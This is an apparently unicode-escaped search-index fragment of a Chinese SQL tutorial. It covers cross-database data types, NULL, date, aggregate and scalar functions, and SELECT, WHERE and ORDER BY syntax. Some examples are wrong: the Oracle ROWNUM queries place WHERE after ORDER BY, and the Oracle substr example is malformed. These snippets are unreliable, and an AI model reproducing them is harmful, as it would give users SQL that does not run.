\u5143\u7d20\u7684\u56fa\u5b9a\u957f\u5ea6\u7684\u6709\u5e8f\u96c6\u5408 MULTISET \u5143\u7d20\u7684\u53ef\u53d8\u957f\u5ea6\u7684\u65e0\u5e8f\u96c6\u5408 XML \u5b58\u50a8 XML \u6570\u636e 2\u3001SQL \u6570\u636e\u7c7b\u578b\u5feb\u901f\u53c2\u8003\u624b\u518c \u6570\u636e\u7c7b\u578b Access SQLServer Oracle MySQL PostgreSQL boolean Yes/No Bit Byte N/A Boolean integer Number (integer) Int Number Int Integer Int Integer float Number (single) Float Real Number Float Numeric currency Currency Money N/A N/A Money string (fixed) N/A Char Char Char Char string (variable) Text (<256) Memo (65k+) Varchar Varchar Varchar2 Varchar Varchar binary object OLE Object Memo Binary (fixed up to 8K) Varbinary (<8K) Image (<2GB) Long Raw Blob Text Binary Varbinary 3\u3001SQL \u7528\u4e8e\u5404\u79cd\u6570\u636e\u5e93\u7684\u6570\u636e\u7c7b\u578b \uff081\uff09Microsoft Access \u6570\u636e\u7c7b\u578b \uff082\uff09MySQL \u6570\u636e\u7c7b\u578b a\u3001 Text \u7c7b\u578b b\u3001 Number \u7c7b\u578b \u6ce8\u610f\uff1a\u4ee5\u4e0a\u7684 size \u4ee3\u8868\u7684\u5e76\u4e0d\u662f\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\u7684\u5177\u4f53\u7684\u957f\u5ea6\uff0c\u5982 int(4) \u5e76\u4e0d\u662f\u53ea\u80fd\u5b58\u50a84\u4e2a\u957f\u5ea6\u7684\u6570\u5b57\uff0c\u5b9e\u9645\u4e0aint(size)\u6240\u5360\u591a\u5c11\u5b58\u50a8\u7a7a\u95f4\u5e76\u65e0\u4efb\u4f55\u5173\u7cfb\u3002int(3)\u3001int(4)\u3001int(8) \u5728\u78c1\u76d8\u4e0a\u90fd\u662f\u5360\u7528 4 btyes \u7684\u5b58\u50a8\u7a7a\u95f4\uff0c\u5c31\u662f\u663e\u793a\u7684\u957f\u5ea6\u4e0d\u4e00\u6837\u800c\u5df2 \u90fd\u662f\u5360\u7528\u56db\u4e2a\u5b57\u8282\u7684\u7a7a\u95f4\uff1b c\u3001 Date \u7c7b\u578b \uff083\uff09SQL Server \u6570\u636e\u7c7b\u578b a\u3001 String \u7c7b\u578b b\u3001 Number \u7c7b\u578b c\u3001 Date \u7c7b\u578b d\u3001 \u5176\u4ed6\u6570\u636e\u7c7b\u578b \u56db\u3001\u51fd\u6570 1\u3001NULL \u7528\u4e8e\u5904\u7406\u503c\u4e3aNULL\uff0c\u9700\u8981\u66ff\u6362\u7684\u60c5\u51b5\uff1b -- SQL Server / MS Access\uff0c\u8868\u793a\u5982\u679cUnitsOnOrder\u5217\u4e2d\u503c\u4e3aNULL\uff0c\u66ff\u6362\u4e3a0\u8fdb\u884c\u8ba1\u7b97 SELECT ProductName,UnitPrice*(UnitsInStock+ISNULL(UnitsOnOrder,0)) FROM Products -- Oracle\uff0c\u6ca1\u6709ISNULL()\u51fd\u6570\uff0c\u4f46\u662f\u6709NVL()\uff0c\u540c\u4e0a SELECT ProductName,UnitPrice*(UnitsInStock+NVL(UnitsOnOrder,0)) FROM Products -- MySQL SELECT ProductName,UnitPrice*(UnitsInStock+IFNULL(UnitsOnOrder,0)) FROM Products -- \u6216 SELECT ProductName,UnitPrice*(UnitsInStock+COALESCE(UnitsOnOrder,0)) FROM Products 2\u3001Date \uff081\uff09MySQL \u4e2d\u6700\u91cd\u8981\u7684\u5185\u5efa\u65e5\u671f\u51fd\u6570\uff1a \u51fd\u6570 \u63cf\u8ff0 NOW() \u8fd4\u56de\u5f53\u524d\u7684\u65e5\u671f\u548c\u65f6\u95f4 CURDATE() \u8fd4\u56de\u5f53\u524d\u7684\u65e5\u671f CURTIME() \u8fd4\u56de\u5f53\u524d\u7684\u65f6\u95f4 DATE() \u63d0\u53d6\u65e5\u671f\u6216\u65e5\u671f/\u65f6\u95f4\u8868\u8fbe\u5f0f\u7684\u65e5\u671f\u90e8\u5206 EXTRACT() \u8fd4\u56de\u65e5\u671f/\u65f6\u95f4\u7684\u5355\u72ec\u90e8\u5206 DATE_ADD() \u5411\u65e5\u671f\u6dfb\u52a0\u6307\u5b9a\u7684\u65f6\u95f4\u95f4\u9694 DATE_SUB() \u4ece\u65e5\u671f\u51cf\u53bb\u6307\u5b9a\u7684\u65f6\u95f4\u95f4\u9694 DATEDIFF() \u8fd4\u56de\u4e24\u4e2a\u65e5\u671f\u4e4b\u95f4\u7684\u5929\u6570 DATE_FORMAT() \u7528\u4e0d\u540c\u7684\u683c\u5f0f\u663e\u793a\u65e5\u671f/\u65f6\u95f4 MySQL \u4f7f\u7528\u4e0b\u5217\u6570\u636e\u7c7b\u578b\u5728\u6570\u636e\u5e93\u4e2d\u5b58\u50a8\u65e5\u671f\u6216\u65e5\u671f/\u65f6\u95f4\u503c\uff1a DATE - \u683c\u5f0f\uff1aYYYY-MM-DD DATETIME - \u683c\u5f0f\uff1aYYYY-MM-DD HH:MM:SS TIMESTAMP - \u683c\u5f0f\uff1aYYYY-MM-DD HH:MM:SS YEAR - \u683c\u5f0f\uff1aYYYY \u6216 YY \uff082\uff09SQL Server \u4e2d\u6700\u91cd\u8981\u7684\u5185\u5efa\u65e5\u671f\u51fd\u6570\uff1a \u51fd\u6570 \u63cf\u8ff0 GETDATE() \u8fd4\u56de\u5f53\u524d\u7684\u65e5\u671f\u548c\u65f6\u95f4 DATEPART() \u8fd4\u56de\u65e5\u671f/\u65f6\u95f4\u7684\u5355\u72ec\u90e8\u5206 DATEADD() \u5728\u65e5\u671f\u4e2d\u6dfb\u52a0\u6216\u51cf\u53bb\u6307\u5b9a\u7684\u65f6\u95f4\u95f4\u9694 DATEDIFF() \u8fd4\u56de\u4e24\u4e2a\u65e5\u671f\u4e4b\u95f4\u7684\u65f6\u95f4 CONVERT() \u7528\u4e0d\u540c\u7684\u683c\u5f0f\u663e\u793a\u65e5\u671f/\u65f6\u95f4 SQL Server \u4f7f\u7528\u4e0b\u5217\u6570\u636e\u7c7b\u578b\u5728\u6570\u636e\u5e93\u4e2d\u5b58\u50a8\u65e5\u671f\u6216\u65e5\u671f/\u65f6\u95f4\u503c\uff1a DATE - \u683c\u5f0f\uff1aYYYY-MM-DD DATETIME - \u683c\u5f0f\uff1aYYYY-MM-DD HH:MM:SS SMALLDATETIME - \u683c\u5f0f\uff1aYYYY-MM-DD HH:MM:SS TIMESTAMP - \u683c\u5f0f\uff1a\u552f\u4e00\u7684\u6570\u5b57 \uff083\uff09\u5982\u679c\u60a8\u5e0c\u671b\u4f7f\u67e5\u8be2\u7b80\u5355\u4e14\u66f4\u6613\u7ef4\u62a4\uff0c\u90a3\u4e48\u8bf7\u4e0d\u8981\u5728\u65e5\u671f\u4e2d\u4f7f\u7528\u65f6\u95f4\u90e8\u5206\uff0c\u5982\u679c\u6ca1\u6709\u65f6\u95f4\u90e8\u5206\uff0c\u9ed8\u8ba4\u65f6\u95f4\u4e3a 00:00:00\uff0c\u6240\u4ee5\u53ef\u80fd\u67e5\u4e0d\u5230\u7ed3\u679c\uff1b 3\u3001Aggregate SQL Aggregate \u51fd\u6570\u8ba1\u7b97\u4ece\u5217\u4e2d\u53d6\u5f97\u7684\u503c\uff0c\u8fd4\u56de\u4e00\u4e2a\u5355\u4e00\u7684\u503c\uff1b \uff081\uff09AVG() \u51fd\u6570\u8fd4\u56de\u6570\u503c\u5217\u7684\u5e73\u5747\u503c\uff1b SELECT AVG(column_name) FROM table_name \uff082\uff09COUNT() \u51fd\u6570\u8fd4\u56de\u5339\u914d\u6307\u5b9a\u6761\u4ef6\u7684\u884c\u6570\uff1b -- COUNT(column_name) \u51fd\u6570\u8fd4\u56de\u6307\u5b9a\u5217\u7684\u503c\u7684\u6570\u76ee\uff08NULL \u4e0d\u8ba1\u5165\uff09 SELECT COUNT(column_name) FROM table_name; -- COUNT(*) \u51fd\u6570\u8fd4\u56de\u8868\u4e2d\u7684\u8bb0\u5f55\u6570 SELECT COUNT(*) FROM table_name; -- COUNT(DISTINCT column_name) \u51fd\u6570\u8fd4\u56de\u6307\u5b9a\u5217\u7684\u4e0d\u540c\u503c\u7684\u6570\u76ee SELECT COUNT(DISTINCT column_name) FROM table_name; -- COUNT(DISTINCT) \u9002\u7528\u4e8e ORACLE \u548c Microsoft SQL Server\uff0c\u4f46\u662f\u65e0\u6cd5\u7528\u4e8e Microsoft Access \uff083\uff09FIRST() \u51fd\u6570\u8fd4\u56de\u6307\u5b9a\u7684\u5217\u4e2d\u7b2c\u4e00\u4e2a\u8bb0\u5f55\u7684\u503c\uff1b -- \u53ea\u6709 MS Access \u652f\u6301 FIRST() \u51fd\u6570 SELECT FIRST(column_name) FROM table_name; -- SQL Server SELECT TOP 1 column_name FROM table_name ORDER BY column_name ASC; -- MySQL SELECT column_name FROM table_name ORDER BY column_name ASC LIMIT 1; -- Oracle SELECT column_name FROM table_name ORDER BY column_name ASC WHERE ROWNUM <=1; \uff084\uff09LAST() \u51fd\u6570\u8fd4\u56de\u6307\u5b9a\u7684\u5217\u4e2d\u6700\u540e\u4e00\u4e2a\u8bb0\u5f55\u7684\u503c\uff1b -- \u53ea\u6709 MS Access \u652f\u6301 LAST() \u51fd\u6570 SELECT LAST(column_name) FROM table_name; -- SQL Server SELECT TOP 1 column_name FROM table_name ORDER BY column_name DESC; -- MySQL SELECT column_name FROM table_name ORDER BY column_name DESC LIMIT 1; -- Oracle SELECT column_name FROM table_name ORDER BY column_name DESC WHERE ROWNUM <=1; \uff085\uff09MAX() \u51fd\u6570\u8fd4\u56de\u6307\u5b9a\u5217\u7684\u6700\u5927\u503c\uff1b SELECT MAX(column_name) FROM table_name; \uff086\uff09MIN() \u51fd\u6570\u8fd4\u56de\u6307\u5b9a\u5217\u7684\u6700\u5c0f\u503c\uff1b SELECT MIN(column_name) FROM table_name; \uff087\uff09SUM() \u51fd\u6570\u8fd4\u56de\u6570\u503c\u5217\u7684\u603b\u6570\uff1b SELECT SUM(column_name) FROM table_name; \uff088\uff09GROUP BY \u8bed\u53e5\u7528\u4e8e\u7ed3\u5408\u805a\u5408\u51fd\u6570\uff0c\u6839\u636e\u4e00\u4e2a\u6216\u591a\u4e2a\u5217\u5bf9\u7ed3\u679c\u96c6\u8fdb\u884c\u5206\u7ec4\uff1b SELECT column_name, aggregate_function(column_name) FROM table_name WHERE column_name operator value GROUP BY column_name; \uff089\uff09\u5728 SQL \u4e2d\u589e\u52a0 HAVING \u5b50\u53e5\u539f\u56e0\u662f\uff0cWHERE \u5173\u952e\u5b57\u65e0\u6cd5\u4e0e\u805a\u5408\u51fd\u6570\u4e00\u8d77\u4f7f\u7528\uff0cHAVING \u5b50\u53e5\u53ef\u4ee5\u8ba9\u6211\u4eec\u7b5b\u9009\u5206\u7ec4\u540e\u7684\u5404\u7ec4\u6570\u636e\uff1b SELECT column_name, aggregate_function(column_name) FROM table_name WHERE column_name operator value GROUP BY column_name HAVING aggregate_function(column_name) operator value; -- \u5b9e\u4f8b SELECT Websites.name, Websites.url, SUM(access_log.count) AS nums FROM (access_log INNER JOIN Websites ON access_log.site_id=Websites.id) GROUP BY Websites.name HAVING SUM(access_log.count) > 200; \uff0810\uff09EXISTS \u8fd0\u7b97\u7b26\u7528\u4e8e\u5224\u65ad\u67e5\u8be2\u5b50\u53e5\u662f\u5426\u6709\u8bb0\u5f55\uff0c\u5982\u679c\u6709\u4e00\u6761\u6216\u591a\u6761\u8bb0\u5f55\u5b58\u5728\u8fd4\u56de True\uff0c\u5426\u5219\u8fd4\u56de False\uff1b SELECT column_name(s) FROM table_name WHERE EXISTS (SELECT column_name FROM table_name WHERE condition); -- EXISTS \u53ef\u4ee5\u4e0e NOT \u4e00\u540c\u4f7f\u7528\uff0c\u67e5\u627e\u51fa\u4e0d\u7b26\u5408\u67e5\u8be2\u8bed\u53e5\u7684\u8bb0\u5f55 SELECT Websites.name, Websites.url FROM Websites WHERE NOT EXISTS (SELECT count FROM access_log WHERE Websites.id = access_log.site_id AND count > 200); 4\u3001Scalar SQL Scalar \u51fd\u6570\u57fa\u4e8e\u8f93\u5165\u503c\uff0c\u8fd4\u56de\u4e00\u4e2a\u5355\u4e00\u7684\u503c\uff1b \uff081\uff09UCASE() \u51fd\u6570\u628a\u5b57\u6bb5\u7684\u503c\u8f6c\u6362\u4e3a\u5927\u5199\uff1b SELECT UCASE(column_name) FROM table_name; -- SQL Server SELECT UPPER(column_name) FROM table_name; \uff082\uff09LCASE() \u51fd\u6570\u628a\u5b57\u6bb5\u7684\u503c\u8f6c\u6362\u4e3a\u5c0f\u5199\uff1b SELECT LCASE(column_name) FROM table_name; -- \u7528\u4e8e SQL Server \u7684\u8bed\u6cd5 SELECT LOWER(column_name) FROM table_name; \uff083\uff09MID() \u51fd\u6570\u7528\u4e8e\u4ece\u6587\u672c\u5b57\u6bb5\u4e2d\u63d0\u53d6\u5b57\u7b26\uff1b SELECT MID(column_name,start[,length]) FROM table_name; /* column_name \u5fc5\u9700\u3002\u8981\u63d0\u53d6\u5b57\u7b26\u7684\u5b57\u6bb5\u3002 start \u5fc5\u9700\u3002\u89c4\u5b9a\u5f00\u59cb\u4f4d\u7f6e\uff08\u8d77\u59cb\u503c\u662f 1\uff09\u3002 length \u53ef\u9009\u3002\u8981\u8fd4\u56de\u7684\u5b57\u7b26\u6570\u3002\u5982\u679c\u7701\u7565\uff0c\u5219 MID() \u51fd\u6570\u8fd4\u56de\u5269\u4f59\u6587\u672c\u3002 */ -- Oracle select substr((\"\u5217\u540d\"\uff0ca,b) from <table_name>; \uff084\uff09LEN() \u51fd\u6570\u8fd4\u56de\u6587\u672c\u5b57\u6bb5\u4e2d\u503c\u7684\u957f\u5ea6\uff1b SELECT LEN(column_name) FROM table_name; -- MySQL SELECT LENGTH(column_name) FROM table_name; \uff085\uff09ROUND() \u51fd\u6570\u7528\u4e8e\u628a\u6570\u503c\u5b57\u6bb5\u820d\u5165\u4e3a\u6307\u5b9a\u7684\u5c0f\u6570\u4f4d\u6570\uff1b SELECT ROUND(column_name,decimals) FROM table_name; /* column_name \u5fc5\u9700\u3002\u8981\u820d\u5165\u7684\u5b57\u6bb5\u3002 decimals \u5fc5\u9700\u3002\u89c4\u5b9a\u8981\u8fd4\u56de\u7684\u5c0f\u6570\u4f4d\u6570\u3002 */ -- ROUND(X)\uff1a \u8fd4\u56de\u53c2\u6570X\u7684\u56db\u820d\u4e94\u5165\u7684\u4e00\u4e2a\u6574\u6570 -- ROUND(X,D)\uff1a \u8fd4\u56de\u53c2\u6570X\u7684\u56db\u820d\u4e94\u5165\u7684\u6709 D \u4f4d\u5c0f\u6570\u7684\u4e00\u4e2a\u6570\u5b57\u3002\u5982\u679cD\u4e3a0\uff0c\u7ed3\u679c\u5c06\u6ca1\u6709\u5c0f\u6570\u70b9\u6216\u5c0f\u6570\u90e8\u5206\u3002 -- ROUND \u8fd4\u56de\u503c\u88ab\u53d8\u6362\u4e3a\u4e00\u4e2aBIGINT \uff086\uff09FORMAT() \u51fd\u6570\u7528\u4e8e\u5bf9\u5b57\u6bb5\u7684\u663e\u793a\u8fdb\u884c\u683c\u5f0f\u5316\uff1b SELECT FORMAT(column_name,format) FROM table_name; /* column_name \u5fc5\u9700\u3002\u8981\u683c\u5f0f\u5316\u7684\u5b57\u6bb5\u3002 format \u5fc5\u9700\u3002\u89c4\u5b9a\u683c\u5f0f\u3002 */","title":"sql"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#sql","text":"SQL\uff08Structured Query Language\uff09\uff0c\u7ed3\u6784\u5316\u67e5\u8be2\u8bed\u8a00\uff0c\u7528\u4e8e\u8bbf\u95ee\u548c\u5904\u7406\u6570\u636e\u5e93\u7684\u6807\u51c6\u7684\u8ba1\u7b97\u673a\u8bed\u8a00\u3002 \u9664\u4e86 SQL \u6807\u51c6\u4e4b\u5916\uff0c\u5927\u90e8\u5206 SQL \u6570\u636e\u5e93\u7a0b\u5e8f\u90fd\u62e5\u6709\u5b83\u4eec\u81ea\u5df1\u7684\u4e13\u6709\u6269\u5c55\uff01","title":"SQL"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#_1","text":"1\u3001SQL\u5bf9\u5927\u5c0f\u5199\u4e0d\u654f\u611f\uff1b 2\u3001\u67d0\u4e9b\u6570\u636e\u5e93\u8981\u6c42\u6bcf\u6761\u8bed\u53e5\u4f7f\u7528\u5206\u53f7\u95f4\u9694\uff1b 3\u3001\u4e00\u4e9b\u91cd\u8981\u7684SQL\u547d\u4ee4\uff1a \u547d\u4ee4 \u63cf\u8ff0 SELECT \u4ece\u6570\u636e\u5e93\u4e2d\u63d0\u53d6\u6570\u636e UPDATE \u66f4\u65b0\u6570\u636e\u5e93\u4e2d\u7684\u6570\u636e DELETE \u4ece\u6570\u636e\u5e93\u4e2d\u5220\u9664\u6570\u636e INSERT INTO \u5411\u6570\u636e\u5e93\u4e2d\u63d2\u5165\u65b0\u6570\u636e CREATE DATABASE \u521b\u5efa\u65b0\u6570\u636e\u5e93 ALTER DATABASE \u4fee\u6539\u6570\u636e\u5e93 CREATE TABLE \u521b\u5efa\u65b0\u8868 ALTER TABLE \u53d8\u66f4\uff08\u6539\u53d8\uff09\u6570\u636e\u5e93\u8868 DROP TABLE \u5220\u9664\u8868 CREATE INDEX \u521b\u5efa\u7d22\u5f15\uff08\u641c\u7d22\u952e\uff09 DROP INDEX \u5220\u9664\u7d22\u5f15 4\u3001\u6ce8\u91ca\uff0c\u5355\u884c\u4e00\u822c\u4f7f\u7528 -- \uff0c\u591a\u884c\u4f7f\u7528 /**/ \uff0cMySQL\u8fd8\u53ef\u4f7f\u7528 # \u8fdb\u884c\u5355\u884c\u6ce8\u91ca\u3002","title":"\u4e00\u3001\u57fa\u672c\u8bed\u6cd5"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#_2","text":"","title":"\u4e8c\u3001\u8bed\u53e5\u8be6\u89e3"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#1select","text":"\uff081\uff09SELECT \u8bed\u53e5\u7528\u4e8e\u4ece\u6570\u636e\u5e93\u4e2d\u9009\u53d6\u6570\u636e\uff0c\u7ed3\u679c\u88ab\u5b58\u50a8\u5728\u4e00\u4e2a\u7ed3\u679c\u8868\u4e2d\uff0c\u79f0\u4e3a\u7ed3\u679c\u96c6\uff1b \uff082\uff09\u8bed\u6cd5\u5982\u4e0b\uff1a SELECT column_name,column_name FROM table_name; SELECT * FROM table_name; \uff083\uff09SELECT DISTINCT \u8bed\u53e5\u7528\u4e8e\u8fd4\u56de\u552f\u4e00\u4e0d\u540c\u7684\u503c\uff1a SELECT DISTINCT column_name,column_name FROM table_name; \uff084\uff09SELECT TOP \u5b50\u53e5\u7528\u4e8e\u89c4\u5b9a\u8981\u8fd4\u56de\u7684\u8bb0\u5f55\u7684\u6570\u76ee\uff1a -- SQL Server / MS Access \u8bed\u6cd5 SELECT TOP number|percent column_name(s) FROM table_name; -- \u4f8b\u5982\uff0cSELECT TOP 50 PERCENT * FROM Websites; -- \u8fd4\u56de\u6700\u540e5\u884c\uff0cselect top 5 * from table order by id desc -- MySQL \u8bed\u6cd5 SELECT column_name(s) FROM table_name LIMIT number; -- Oracle \u8bed\u6cd5 SELECT column_name(s) FROM table_name WHERE ROWNUM <= number; \uff085\uff09SELECT INTO \u8bed\u53e5\u4ece\u4e00\u4e2a\u8868\u590d\u5236\u6570\u636e\uff0c\u7136\u540e\u628a\u6570\u636e\u63d2\u5165\u5230\u53e6\u4e00\u4e2a\u65b0\u8868\u4e2d\uff1b SELECT column_name(s) INTO newtable [IN externaldb] FROM table1; -- \u6837\u4f8b SELECT * INTO WebsitesBackup2016 FROM Websites; SELECT Websites.name, access_log.count, access_log.date INTO WebsitesBackup2016 FROM Websites LEFT JOIN access_log ON Websites.id=access_log.site_id; -- SELECT INTO\u8bed\u53e5\u53ef\u7528\u4e8e\u901a\u8fc7\u53e6\u4e00\u79cd\u6a21\u5f0f\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u7a7a\u8868\uff0c\u53ea\u9700\u8981\u6dfb\u52a0\u4fc3\u4f7f\u67e5\u8be2\u6ca1\u6709\u6570\u636e\u8fd4\u56de\u7684 WHERE \u5b50\u53e5\u5373\u53ef SELECT * INTO newtable FROM table1 WHERE 1=0; -- MySQL \u6570\u636e\u5e93\u4e0d\u652f\u6301 SELECT ... INTO \u8bed\u53e5\uff0c\u4f46\u652f\u6301 INSERT INTO ... SELECT","title":"1\u3001SELECT"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#2where","text":"\uff081\uff09WHERE \u5b50\u53e5\u7528\u4e8e\u63d0\u53d6\u90a3\u4e9b\u6ee1\u8db3\u6307\u5b9a\u6761\u4ef6\u7684\u8bb0\u5f55\uff1b \uff082\uff09\u8bed\u6cd5\u5982\u4e0b\uff1a SELECT column_name,column_name FROM table_name WHERE column_name operator value; -- \u4f8b\u5982\uff1aSELECT * FROM Websites WHERE country='CN'; -- SELECT * FROM Websites WHERE id=1; \uff083\uff09\u5bf9\u4e8e\u6587\u672c\u5b57\u6bb5\u4f7f\u7528\u5355\u5f15\u53f7\u4e14\u533a\u5206\u5927\u5c0f\u5199\uff0c\u5bf9\u4e8e\u6570\u503c\u5b57\u6bb5\u76f4\u63a5\u6570\u503c\u5373\u53ef\uff1b \uff084\uff09\u53ef\u4ee5\u4f7f\u7528\u7684\u8fd0\u7b97\u7b26\uff1a = \u7b49\u4e8e <> \u4e0d\u7b49\u4e8e > \u5927\u4e8e < \u5c0f\u4e8e >= \u5927\u4e8e\u7b49\u4e8e <= \u5c0f\u4e8e\u7b49\u4e8e BETWEEN(and) \u5728\u67d0\u4e2a\u8303\u56f4\u5185\uff0c\u4e14\u4e0b\u9650\u5728\u524d\u4e0a\u9650\u5728\u540e\uff0c\u5e76\u4e14\u5305\u542b\u4e0a\u4e0b\u9650\u503c LIKE \u641c\u7d22\u67d0\u79cd\u6a21\u5f0f IN \u6307\u5b9a\u9488\u5bf9\u67d0\u4e2a\u5217\u7684\u591a\u4e2a\u53ef\u80fd\u503c \uff085\uff09\u903b\u8f91\u8fd0\u7b97\u7b26\uff1a not and or \uff086\uff09\u7279\u6b8a\u6761\u4ef6\uff1a is null \uff087\uff09LIKE\u6a21\u7cca\u67e5\u8be2\uff1a % \u8868\u793a\u591a\u4e2a\u5b57\u503c\uff0c_ \u4e0b\u5212\u7ebf\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff1b M% : \u4e3a\u80fd\u914d\u7b26\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u8868\u793a\u7684\u610f\u601d\u4e3a\u6a21\u7cca\u67e5\u8be2\u4fe1\u606f\u4e3a M \u5f00\u5934\u7684\uff1b %M% : \u8868\u793a\u67e5\u8be2\u5305\u542bM\u7684\u6240\u6709\u5185\u5bb9\uff1b %M_ : \u8868\u793a\u67e5\u8be2\u4ee5M\u5728\u5012\u6570\u7b2c\u4e8c\u4f4d\u7684\u6240\u6709\u5185\u5bb9\uff1b -- \u4f8b\u5982\uff0cSELECT * FROM Websites WHERE name LIKE 'G%'; -- \u901a\u8fc7NOT\u5173\u952e\u8bcd\uff0c\u53ef\u4ee5\u9009\u53d6\u4e0d\u5339\u914d\u6a21\u5f0f\uff0c\u4f8b\u5982\uff0cSELECT * FROM Websites WHERE name NOT LIKE '%oo%'; -- \u8f6c\u4e49_\u548c%\u4f7f\u7528escape\uff0c\u4f8b\u5982\uff0cselect * from username where \u540d\u5b57 like '\u6bb5\\_%' escape '\\'; \uff088\uff09LIKE\u548cREGEXP LIKE\u80fd\u7528\u7684\u901a\u914d\u7b26\uff0c%\uff0c_\uff0c[charlist]\uff0c[^charlist]\u6216[!charlist]\uff1b \u4e0d\u8fc7\uff0cMySQL \u3001SQLite \u53ea\u652f\u6301 % \u548c _ \u901a\u914d\u7b26\uff0c\u4e0d\u652f\u6301 [^charlist] \u6216 [!charlist] \u901a\u914d\u7b26\uff1b MS Access \u652f\u6301\uff0c\u5fae\u8f6f office \u5bf9\u901a\u914d\u7b26\u4e00\u76f4\u652f\u6301\u826f\u597d\uff0c\u4f46\u5fae\u8f6f\u6709\u65f6\u5019\u7684\u901a\u914d\u7b26\u4e0d\u652f\u6301 %\uff0c\u800c\u662f *\uff0c\u5177\u4f53\u770b\u5bf9\u5e94\u8f6f\u4ef6\u8bf4\u660e\uff1b MySQL \u4e2d\u8981\u5b8c\u6210 [^charlist] \u6216 [!charlist] \u901a\u914d\u7b26\u7684\u67e5\u8be2\u6548\u679c\uff0c\u9700\u8981\u901a\u8fc7\u6b63\u5219\u8868\u8fbe\u5f0f\u6765\u5b8c\u6210\uff1b SQLite\u4e0d\u652f\u6301Regexp\u6b63\u5219\u65b9\u6cd5\uff1b MySQL \u4e2d\u4f7f\u7528 REGEXP \u6216 NOT REGEXP \u8fd0\u7b97\u7b26 (\u6216 RLIKE \u548c NOT RLIKE) \u6765\u64cd\u4f5c\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u7528\u6cd5\u540cLIKE\uff1b -- \u4f8b\u5982\uff0cSELECT * FROM Websites WHERE name REGEXP '^[A-H]'; \uff089\uff09WHERE \u5b50\u53e5\u5e76\u4e0d\u4e00\u5b9a\u5e26\u6bd4\u8f83\u8fd0\u7b97\u7b26\uff0c\u5f53\u4e0d\u5e26\u8fd0\u7b97\u7b26\u65f6\uff0c\u4f1a\u6267\u884c\u4e00\u4e2a\u9690\u5f0f\u8f6c\u6362\uff0c\u5f53 0 \u65f6\u8f6c\u5316\u4e3a false\uff0c1 \u8f6c\u5316\u4e3a true\uff1b SELECT studentNO FROM student WHERE 0; SELECT studentNO FROM student WHERE 1; \uff0810\uff09IN\u8bed\u6cd5\uff1a SELECT column_name(s) FROM table_name WHERE column_name IN (value1,value2,...); \uff0811\uff09BETWEEN\u8bed\u6cd5\uff1a SELECT column_name(s) FROM table_name WHERE column_name BETWEEN value1 AND value2; -- NOT BETWEEN\uff0c\u8868\u793a\u4e0d\u5728\u5176\u4e2d SELECT * FROM Websites WHERE alexa NOT BETWEEN 1 AND 20; -- \u5e26\u6709 IN \u7684 BETWEEN SELECT * FROM Websites WHERE (alexa BETWEEN 1 AND 20) AND country NOT IN ('USA', 'IND'); -- \u5e26\u6709\u6587\u672c\u503c\u7684 BETWEEN SELECT * FROM Websites WHERE name BETWEEN 'A' AND 'H'; -- \u9009\u53d6 name \u4ee5\u4ecb\u4e8e 'A' \u548c 'H' \u4e4b\u95f4\u5b57\u6bcd\u5f00\u59cb\u7684\u6240\u6709\u7f51\u7ad9 -- \u5e26\u6709\u6587\u672c\u503c\u7684 NOT BETWEEN SELECT * FROM Websites WHERE name NOT BETWEEN 'A' AND 'H'; -- \u5e26\u6709\u65e5\u671f\u503c\u7684 BETWEEN SELECT * FROM access_log WHERE date BETWEEN '2016-05-10' AND '2016-05-14'; -- \u9009\u53d6 date \u4ecb\u4e8e '2016-05-10' \u548c '2016-05-14' \u4e4b\u95f4\u7684\u6240\u6709\u8bbf\u95ee\u8bb0\u5f55 /*\u8bf7\u6ce8\u610f\uff0c\u5728\u4e0d\u540c\u7684\u6570\u636e\u5e93\u4e2d\uff0cBETWEEN \u64cd\u4f5c\u7b26\u4f1a\u4ea7\u751f\u4e0d\u540c\u7684\u7ed3\u679c\uff01 \u5728\u67d0\u4e9b\u6570\u636e\u5e93\u4e2d\uff0cBETWEEN \u9009\u53d6\u4ecb\u4e8e\u4e24\u4e2a\u503c\u4e4b\u95f4\u4f46\u4e0d\u5305\u62ec\u4e24\u4e2a\u6d4b\u8bd5\u503c\u7684\u5b57\u6bb5\u3002 \u5728\u67d0\u4e9b\u6570\u636e\u5e93\u4e2d\uff0cBETWEEN \u9009\u53d6\u4ecb\u4e8e\u4e24\u4e2a\u503c\u4e4b\u95f4\u4e14\u5305\u62ec\u4e24\u4e2a\u6d4b\u8bd5\u503c\u7684\u5b57\u6bb5\u3002 \u5728\u67d0\u4e9b\u6570\u636e\u5e93\u4e2d\uff0cBETWEEN \u9009\u53d6\u4ecb\u4e8e\u4e24\u4e2a\u503c\u4e4b\u95f4\u4e14\u5305\u62ec\u7b2c\u4e00\u4e2a\u6d4b\u8bd5\u503c\u4f46\u4e0d\u5305\u62ec\u6700\u540e\u4e00\u4e2a\u6d4b\u8bd5\u503c\u7684\u5b57\u6bb5\u3002 \u56e0\u6b64\uff0c\u8bf7\u68c0\u67e5\u60a8\u7684\u6570\u636e\u5e93\u662f\u5982\u4f55\u5904\u7406 BETWEEN \u64cd\u4f5c\u7b26\uff01*/","title":"2\u3001WHERE"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#3order-by","text":"\uff081\uff09ORDER BY \u5173\u952e\u5b57\u7528\u4e8e\u5bf9\u7ed3\u679c\u96c6\u6309\u7167\u4e00\u4e2a\u5217\u6216\u8005\u591a\u4e2a\u5217\u8fdb\u884c\u6392\u5e8f\uff0c\u9ed8\u8ba4\u6309\u7167\u5347\u5e8f\u5bf9\u8bb0\u5f55\u8fdb\u884c\u6392\u5e8f\uff0c\u5982\u679c\u9700\u8981\u6309\u7167\u964d\u5e8f\u5bf9\u8bb0\u5f55\u8fdb\u884c\u6392\u5e8f\uff0c\u4f7f\u7528 DESC \u5173\u952e\u5b57\uff1b \uff082\uff09\u8bed\u6cd5\u5982\u4e0b\uff1a SELECT column_name,column_name FROM table_name ORDER BY column_name,column_name ASC|DESC; \uff083\uff09ORDER BY \u591a\u5217\u7684\u65f6\u5019\uff1a order by A,B \u8fd9\u4e2a\u65f6\u5019\u90fd\u662f\u9ed8\u8ba4\u6309\u5347\u5e8f\u6392\u5217 order by A desc,B 